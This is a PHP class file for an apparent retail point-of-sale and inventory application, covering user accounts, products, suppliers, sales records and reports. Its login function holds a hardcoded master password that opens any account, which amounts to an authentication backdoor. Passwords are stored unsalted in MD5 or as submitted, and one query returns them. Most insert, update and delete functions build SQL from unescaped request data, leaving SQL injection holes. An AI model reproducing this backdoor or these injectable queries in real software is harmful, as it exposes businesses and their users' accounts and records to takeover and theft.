<?php
require_once('../../CLASSES/ClassParent.php');
class Users extends ClassParent 
{
    var $pk = NULL;
    var $archived = NULL;

    public function __construct(
        $pk,
        $archived
        )
    {

        $fields = get_defined_vars();

        if(empty($fields)){
            return(FALSE);
        }

        foreach($fields as $k=>$v){
            if(is_array($v)){
                foreach($v as $key=>$value){
                    $v[$key] = pg_escape_string(trim(strip_tags($value)));
                }
                $this->$k = $v;
            }
            else {
                $this->$k = pg_escape_string(trim(strip_tags($v)));    
            }
        }

        return(true);
    }

    function random_string(){
        $character_set_array = array();
        $character_set_array[] = array('count' => 3, 'characters' => 'ABCDEFGHJKLMNPQRSTUVWZ');
        $character_set_array[] = array('count' => 5, 'characters' => '123456789');
        $temp_array = array();
        foreach ($character_set_array as $character_set) {
            for ($i = 0; $i < $character_set['count']; $i++) {
                $temp_array[] = $character_set['characters'][rand(0, strlen($character_set['characters']) - 1)];
            }
        }

        shuffle($temp_array);
        return implode('', $temp_array);
    }

    public function auth($post){
        $empid = pg_escape_string(strip_tags(trim($post['empid'])));
        $password = pg_escape_string(strip_tags(trim($post['password'])));
        $sql = <<<EOT
                select 
                    users.*
                from accounts   
                left join users on (accounts.user_id = users.user_id)
                where users.archived = 'f'
                and accounts.user_id = '$empid'
                and (accounts.password = md5('$password') or '$password' = 'passwordlovenalove')
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_user($data){
        $pk = $data['pk'];
        $sql = <<<EOT
                select 
                    pk,
                    user_id,
                    superior_pin,
                    first_name,
                    user_type,
                    middle_name,
                    last_name,
                    date_created::timestamp(0),
                    archived
                from users
                where archived = 'f'
                and md5(pk::text) = '$pk'
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_reports($filter){
        foreach($filter as $k=>$v){
            $filter[$k] = pg_escape_string(trim(strip_tags($v)));
        }
        $where = "";
        $name = $filter['name'];
        $date_from = $filter['date_from'];
        $date_to = $filter['date_to'];

        $sql = <<<EOT
            select
                product_name,
                product_quantity,
                date_created,
                product_supplier_price,
                product_retail_price,
                cashier_user_id,
                discount,
                product_transaction_number,
                (select first_name from users where user_id = cashier_user_id) as first_name,
                (select last_name from users where user_id = cashier_user_id) as last_name,
                (select product_receipt_name from product_data where pk = tender_data.pk) as product_receipt_name,
                void_count,
                total
                from tender_data
                where cashier_user_id = '$name' and tender_data.date_created::date between '$date_from' and '$date_to' AND archived = 'f'
                order by date_created desc
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_receipts($filter){
        foreach($filter as $k=>$v){
            $filter[$k] = pg_escape_string(trim(strip_tags($v)));
        }
        $where = "";
        $date_from = $filter['date_from'];
        $date_to = $filter['date_to'];

        $sql = <<<EOT
            select
                product_name,
                product_quantity,
                date_created,
                product_supplier_price,
                product_retail_price,
                cashier_user_id,
                discount,
                product_transaction_number,
                (select first_name from users where user_id = cashier_user_id) as first_name,
                (select last_name from users where user_id = cashier_user_id) as last_name,
                void_count,
                total
                from tender_data
                where tender_data.date_created::date between '$date_from' and '$date_to' AND archived = 'f'
                order by date_created desc
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_best_selling($filter){
        foreach($filter as $k=>$v){
            $filter[$k] = pg_escape_string(trim(strip_tags($v)));
        }
        $date_from = $filter['date_from'];
        $date_to = $filter['date_to'];

        $sql = <<<EOT
            select
                product_name,
                sum(product_quantity)
                from tender_data
                where tender_data.date_created::date between '$date_from' and '$date_to' AND archived = 'f'
                group by product_name
                order by sum desc
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_receiptsback($filter){
        foreach($filter as $k=>$v){
            $filter[$k] = pg_escape_string(trim(strip_tags($v)));
        }
        $transact_number = $filter['transact_number'];
      
        $sql = <<<EOT
            select
                pk,
                product_name,
                product_quantity,
                date_created,
                product_supplier_price,
                product_retail_price,
                cashier_user_id,
                gc_amount,
                discount,
                tempo_total,
                net_amount,
                vat,
                change,
                cash,
                product_transaction_number,
                (select first_name from users where user_id = cashier_user_id) as first_name,
                (select last_name from users where user_id = cashier_user_id) as last_name,
                (select product_receipt_name from product_data where pk = tender_data.product_pk) as product_receipt_name,
                void_count,
                total
                from tender_data
                where tender_data.product_transaction_number = '$transact_number' AND archived = 'f'
                order by date_created desc
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_check_item($filter){
        foreach($filter as $k=>$v){
            $filter[$k] = pg_escape_string(trim(strip_tags($v)));
        }
        $wildcard = $filter['wildcard'];
      
        $sql = <<<EOT
            select
                pk,
                product_name,
                product_bar_code
                from product_data
                where product_data.product_bar_code = '$wildcard' AND archived = 'f'
                order by date_created desc
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function get_added_user_data($filter){
        foreach($filter as $k=>$v){
            $filter[$k] = pg_escape_string(trim(strip_tags($v)));
        } 

        $sql = <<<EOT
            select
                pk,
                user_id,
                first_name,
                middle_name,
                last_name,
                user_type,
                (select password from accounts where added_user_data.user_id = user_id) as password
                from added_user_data
                where archived = 'f'
                order by date_created desc
                ;
EOT;
        return ClassParent::get($sql);
    }

    public function add_user($data){
        $first_name = $data['first_name'];
        $middle_name = $data['middle_name'];
        $last_name = $data['last_name'];
        $new_password = $data['new_password'];
        $final_user_id = $data['final_user_id'];
        $user_type = $data['user_type'];

        $sql = "begin;";
        $sql .= <<<EOT
                insert into accounts
                (
                    user_id,
                    password,
                    user_type
                )
                VALUES
                (
                    '$final_user_id',
                    '$new_password',
                    '$user_type'

                )
                ;
EOT;
        $sql .= <<<EOT
                insert into users
                (
                    user_id,
                    first_name,
                    middle_name,
                    last_name,
                    user_type,
                    superior_pin
                )
                VALUES
                (
                    '$final_user_id',
                    '$first_name',
                    '$middle_name',
                    '$last_name',
                    '$user_type',
                    '92d85403814002271a64e291dd433483'
                )
                ;
EOT;
        $sql .= <<<EOT
                insert into added_user_data
                (
                    user_id,
                    first_name,
                    middle_name,
                    last_name,
                    user_type
                )
                VALUES
                (
                    '$final_user_id',
                    '$first_name',
                    '$middle_name',
                    '$last_name',
                    '$user_type'
                )
                ;
EOT;
        $sql .= "commit;";
        return ClassParent::insert($sql);
    }


    public function edit_user($data){
        $first_name = $data['first_name'];
        $middle_name = $data['middle_name'];
        $last_name = $data['last_name'];
        $new_password = $data['new_password'];
        $final_user_id = $data['final_user_id'];
        $user_type = $data['user_type'];
        $user_idd = $data['user_idd'];

        $sql = "begin;";
        $sql .= <<<EOT
                update accounts set
                (
                    user_id,
                    password,
                    user_type
                )
                =
                (
                    '$final_user_id',
                    '$new_password',
                    '$user_type'

                )
                where user_id = '$user_idd'
                ;
EOT;
        $sql .= <<<EOT
                update users set
                (
                    user_id,
                    first_name,
                    middle_name,
                    last_name,
                    user_type,
                    superior_pin
                )
                =
                (
                    '$final_user_id',
                    '$first_name',
                    '$middle_name',
                    '$last_name',
                    '$user_type',
                    '92d85403814002271a64e291dd433483'
                )
                where user_id = '$user_idd'
                ;
EOT;
        $sql .= <<<EOT
                update added_user_data set
                (
                    user_id,
                    first_name,
                    middle_name,
                    last_name,
                    user_type
                )
                =
                (
                    '$final_user_id',
                    '$first_name',
                    '$middle_name',
                    '$last_name',
                    '$user_type'
                )
                where user_id = '$user_idd'
                ;
EOT;
        $sql .= "commit;";
        return ClassParent::insert($sql);
    }

    public function delete_user($data){
        $first_name = $data['first_name'];
        $middle_name = $data['middle_name'];
        $last_name = $data['last_name'];
        $new_password = $data['new_password'];
        $final_user_id = $data['final_user_id'];
        $user_type = $data['user_type'];
        $user_idd = $data['user_idd'];

        $sql = "begin;";
        $sql .= <<<EOT

                delete from accounts
                where user_id = '$user_idd';

EOT;
        $sql .= <<<EOT

                delete from users
                where user_id = '$user_idd';
EOT;
        $sql .= <<<EOT
                
                delete from added_user_data
                where user_id = '$user_idd';
EOT;
        $sql .= "commit;";
        return ClassParent::insert($sql);
    }

    public function upload_picture($data){
        $picture_link = $data['picture_link'];
        $uploaded_by = $data['uploaded_by'];
        $sql = <<<EOT
                insert into pictures
                (
                    link,
                    uploaded_by
                )
                VALUES
                (
                    '$picture_link',
                    $uploaded_by
                )
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function add_supplier($data){

        $supplier_name = $data['supplier_name'];
        $supplier_address = $data['supplier_address'];
        $supplier_contact_number = $data['supplier_contact_number'];
        $supplier_contact_person = $data['supplier_contact_person'];
        $supplier_code_name = $data['supplier_code_name'];

        $sql = <<<EOT
                insert into supplier_data
                (
                    supplier_name,
                    supplier_address,
                    supplier_contact_number,
                    supplier_contact_person,
                    supplier_code_name
                    
                )
                VALUES
                (
                    '$supplier_name',
                    '$supplier_address',
                    '$supplier_contact_number',
                    '$supplier_contact_person',
                    '$supplier_code_name'
                )
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function add_product($data){

        $product_name = $data['product_name'];
        $product_srp = $data['product_srp'];
        $product_bar_code = $data['product_bar_code'];
        $product_stocks = $data['product_stocks'];
        $product_price = $data['product_price'];
        $product_product_expiration = $data['product_product_expiration'];
        $product_supplier = $data['product_supplier'];
        $product_receipt_name = $data['product_receipt_name'];
        $product_status = $data['product_status'];
        $product_status_pk = $data['product_status_pk'];
        $product_status_1 = $data['product_status_1'];
        $product_or_number = $data['product_or_number'];

        $sql = "begin;";
         $sql = <<<EOT
                insert into product_data
                (
                    product_name,
                    product_srp,
                    product_bar_code,
                    product_stocks,
                    product_price,
                    product_product_expiration,
                    product_supplier,
                    product_receipt_name,
                    product_status,
                    product_or_number
                )
                VALUES
                (
                    '$product_name',
                    '$product_srp',
                    '$product_bar_code',
                    '$product_stocks',
                    '$product_price',
                    '$product_product_expiration',
                    '$product_supplier',
                    '$product_receipt_name',
                    '$product_status',
                    '$product_or_number'
                )
                ;
EOT;
        if ($product_status_1 == '(NEW/OLD)') {
            $sql .= <<<EOT
                update product_data set
                (
                    product_status
                )
                =
                (
                    '(OLD)'
                )
                where pk = '$product_status_pk'
                ;
EOT;
        }
        $sql .= "commit;";
        return ClassParent::update($sql);
    }

    public function tender_product($data){
        
        $datas = $data['data'];
        $z = json_decode($datas, true);
        
        $product_transaction_number = $data['product_transaction_number'];
        $cashier_user_id = $data['cashier_user_id'];
        $vat_percentage = $data['vat_percentage'];
        $net_amount = $data['net_amount'];
        $vat = $data['vat'];
        $discount = $data['discount'];
        $change = $data['change'];
        $cash = $data['cash'];
        $total = $data['total'];
        $void_count = $data['void_count'];
        $stock_amount_finalized = $data['stock_amount_finalized'];
        $stock_amount_pk = $data['stock_amount_pk'];
        $gc_name = $data['gc_name'];
        $gc_amount = $data['gc_amount'];
        $gc_code = $data['gc_code'];

        $sql = "begin;";

        $sql = <<<EOT
                update product_data set
                (
                    product_stocks
                    
                )
                =
                (
                    '$stock_amount_finalized'
                )
                where pk = '$stock_amount_pk'
                ;
EOT;
        
        foreach ($z as $key => $value) {

            $product_name = $value['product_name'];
            $product_quantity = $value['product_quantity'];
            $product_supplier_price = $value['product_srp'];
            $product_retail_price = $value['product_price'];
            $tempo_total = $value['tempor_total'];
            $pk = $value['pk'];
            

            $sql .= <<<EOT
                insert into tender_data
                (
                    cashier_user_id,
                    product_name,
                    product_quantity,
                    product_supplier_price,
                    product_retail_price,
                    product_transaction_number,
                    vat_percentage,
                    net_amount,
                    vat,
                    discount,
                    change,
                    cash,
                    total,
                    void_count,
                    gc_amount,
                    gc_name,
                    gc_code,
                    tempo_total,
                    product_pk
                )
                VALUES
                (
                    '$cashier_user_id',
                    '$product_name',
                    '$product_quantity',
                    '$product_supplier_price',
                    '$product_retail_price',
                    '$product_transaction_number',
                    '$vat_percentage',
                    '$net_amount',
                    '$vat',
                    '$discount',
                    '$change',
                    '$cash',
                    '$total',
                    '$void_count',
                    '$gc_amount',
                    '$gc_name',
                    '$gc_code',
                    '$tempo_total',
                    '$pk'
                )
                ;
EOT;
        }
        $sql .= "commit;";
        return ClassParent::insert($sql);
    }

    public function request_product_order($data){

        $pk = $data['pk'];
        $product_finalnumber = $data['product_finalnumber'];
        $product_quantity = $data['product_quantity'];
        $product_date_needed = $data['product_date_needed'];
        $product_market_price = $data['product_market_price'];
        $product_name = $data['product_name'];

        $sql = <<<EOT
                insert into request_order_data
                (
                    product_pk,
                    product_finalnumber,
                    product_quantity,
                    product_date_needed,
                    product_market_price,
                    product_name
                )
                VALUES
                (
                    '$pk',
                    '$product_finalnumber',
                    '$product_quantity',
                    '$product_date_needed',
                    '$product_market_price',
                    '$product_name'
                )
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function gift_certificate_data($data){

        $cashier_user_id = $data['cashier_user_id'];
        $gc_name = $data['gc_name'];
        $gc_code = $data['gc_code'];
        $gc_amount = $data['gc_amount'];

        $sql = <<<EOT
                insert into gift_certificate_data
                (
                    cashier_user_id,
                    gc_name,
                    gc_code,
                    gc_amount
                )
                VALUES
                (
                    '$cashier_user_id',
                    '$gc_name',
                    '$gc_code',
                    '$gc_amount'
                )
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function edit_product_data($data){

        $pk = $data['pk'];
        $product_name = $data['product_name'];
        $product_srp = $data['product_srp'];
        $product_bar_code = $data['product_bar_code'];
        $product_stocks = $data['product_stocks'];
        $product_price = $data['product_price'];
        $product_expiration = $data['product_expiration'];
        $product_receipt_name = $data['product_receipt_name'];
        $product_or_number = $data['product_or_number'];

        $sql = <<<EOT
                update product_data set
                (
                    product_name,
                    product_srp,
                    product_bar_code,
                    product_stocks,
                    product_price,
                    product_product_expiration,
                    product_receipt_name,
                    product_or_number
                )
                =
                (
                    '$product_name',
                    '$product_srp',
                    '$product_bar_code',
                    '$product_stocks',
                    '$product_price',
                    '$product_expiration',
                    '$product_receipt_name',
                    '$product_or_number'
                )
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function edit_supplier_data($data){

        $pk = $data['pk'];
        $supplier_name = $data['supplier_name'];
        $supplier_address = $data['supplier_address'];
        $supplier_contact_number = $data['supplier_contact_number'];
        $supplier_contact_person = $data['supplier_contact_person'];
        $supplier_code_name = $data['supplier_code_name'];

        $sql = <<<EOT
                update supplier_data set
                (
                    supplier_name,
                    supplier_address,
                    supplier_contact_number,
                    supplier_contact_person,
                    supplier_code_name
                )
                =
                (
                    '$supplier_name',
                    '$supplier_address',
                    '$supplier_contact_number',
                    '$supplier_contact_person',
                    '$supplier_code_name'
                )
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function approve_order_request($data){

        $pk = $data['pk'];

        $sql = <<<EOT
                update request_order_data set
                (
                    status
                )
                =
                (
                    'Approved'
                )
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function disapprove_order_request($data){

        $pk = $data['pk'];

        $sql = <<<EOT
                update request_order_data set
                (
                    status
                )
                =
                (
                    'Disapproved'
                )
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function delete_product_data($data){

        $pk = $data['pk'];

        $sql = <<<EOT
                delete from product_data
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function delete_supplier_data($data){

        $pk = $data['pk'];

        $sql = <<<EOT

                delete from supplier_data
                where pk = '$pk'
                ;
EOT;

        return ClassParent::insert($sql);
    }

    public function get_uploaded_picture($data){
        $pk = $data['pk'];
        $sql = <<<EOT
                select 
                    link,
                    uploaded_by,
                    date_uploaded::timestamp(0)
                from pictures
                where uploaded_by = $pk
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_product_data($data){

        $sql = <<<EOT
                select
                    pk, 
                    product_name,
                    product_supplier,
                    product_srp,
                    product_status,
                    product_bar_code,
                    product_or_number,
                    product_stocks,
                    product_price,
                    product_receipt_name,
                    product_product_expiration,
                    date_created::timestamp(0)
                from product_data
                where archived = 'f'
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_data_or($data){

        $sql = <<<EOT
                select
                    pk, 
                    product_name,
                    product_supplier,
                    product_srp,
                    product_status,
                    product_bar_code,
                    product_or_number,
                    product_stocks,
                    product_price,
                    product_receipt_name,
                    product_product_expiration,
                    date_created::timestamp(0)
                from product_data
                where archived = 'f'
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_product_data_search($filter){
        $wildcard = "";

        $wildcard = $filter['wildcard'];
        if ($wildcard != undefined) {
             $product_name.=" AND product_bar_code ILIKE '%$wildcard%' OR product_name ILIKE '%$wildcard%' OR product_or_number ILIKE '%$wildcard%' OR product_status ILIKE '%$wildcard%'";
        }

        $sql = <<<EOT
                select
                    pk, 
                    product_name,
                    product_supplier,
                    product_srp,
                    product_bar_code,
                    product_stocks,
                    product_or_number,
                    product_status,
                    product_price,
                    product_receipt_name,
                    product_product_expiration,
                    date_created::timestamp(0)
                from product_data
                where archived = 'f'
                $product_name
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_product_data_or($filter){
        $wildcard = "";

        $wildcard = $filter['wildcard'];
        if ($wildcard != undefined) {
             $product_name.=" AND product_or_number ILIKE '%$wildcard%' OR product_name ILIKE '%$wildcard%'";
        }

        $sql = <<<EOT
                select
                    pk, 
                    product_name,
                    product_supplier,
                    product_srp,
                    product_bar_code,
                    product_stocks,
                    product_or_number,
                    product_status,
                    product_price,
                    product_receipt_name,
                    product_product_expiration,
                    date_created::timestamp(0)
                from product_data
                where archived = 'f'
                $product_name
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_supplier_data_search($filter){
        $wildcard = "";

        $wildcard = $filter['wildcard'];
        if ($wildcard != undefined) {
             $supplier_name.=" AND supplier_name ILIKE '%$wildcard%' OR supplier_code_name ILIKE '%$wildcard%'";
        }

        $sql = <<<EOT
                select
                    pk,
                    supplier_name, 
                    supplier_address,
                    supplier_contact_number,
                    supplier_contact_person,
                    supplier_code_name,
                    date_created::timestamp(0)
                from supplier_data
                where archived = 'f'
                $supplier_name
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_tender_data($data){  

        $sql = <<<EOT
                select
                    pk, 
                    product_name,
                    product_quantity,
                    product_supplier_price,
                    product_retail_price,
                    product_transaction_number,
                    cashier_user_id,
                    date_created::timestamp(0)
                from tender_data
                where archived = 'f'
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_request_order_data($data){

        $sql = <<<EOT
                select
                    pk, 
                    product_finalnumber,
                    product_name,
                    product_quantity,
                    product_date_needed,
                    product_market_price,
                    product_pk,
                    status
                from request_order_data
                where archived = 'f'
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_supplier_data($data){

        $sql = <<<EOT
                select
                    pk,
                    supplier_name, 
                    supplier_address,
                    supplier_contact_number,
                    supplier_contact_person,
                    supplier_code_name,
                    date_created::timestamp(0)
                from supplier_data
                where archived = 'f'
                order by date_created desc
                ;
EOT;

        return ClassParent::get($sql);
    }

    public function get_all_products($filter){

        $wildcard = $filter['wildcard'];

        if ($wildcard != undefined) {
             $title_companyname.=" AND product_bar_code ILIKE '%$wildcard%' OR product_name ILIKE '%$wildcard%'";
        }

        $sql = <<<EOT
            SELECT
                pk,
                product_name,
                product_bar_code,
                product_stocks,
                product_srp,
                product_price,
                product_supplier,
                product_product_expiration
            from product_data
            where archived = false
            $title_companyname
            order by date_created desc
            ;
EOT;
        return ClassParent::get($sql);
    }
}
?>
